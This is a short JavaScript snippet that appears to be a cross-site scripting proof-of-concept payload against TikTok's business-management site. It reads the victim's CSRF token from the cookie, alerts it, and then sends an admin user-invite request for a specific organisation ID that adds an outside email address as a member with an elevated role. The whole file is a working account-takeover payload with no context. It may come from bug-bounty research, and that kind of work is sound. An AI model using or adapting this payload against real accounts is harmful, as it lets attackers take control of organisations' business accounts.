var cookie = ("; "+document.cookie).split("; csrftoken=").pop().split(";").shift();
alert(cookie)
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://business.tiktok.com/api/v2/bm/admin/user/invite/?org_id=6725320885500118022', true);
xhr.setRequestHeader('Content-type', 'application/json');
xhr.setRequestHeader('X-Csrftoken', '' +cookie);
xhr.onload = function () {
    console.log(this.responseText);
};
xhr.send('{"advertiser_list":[],"org_id":"6725320885500118022","email_list":["imrannissar78600@gmail.com"],"lang":"en","org_role":1}');
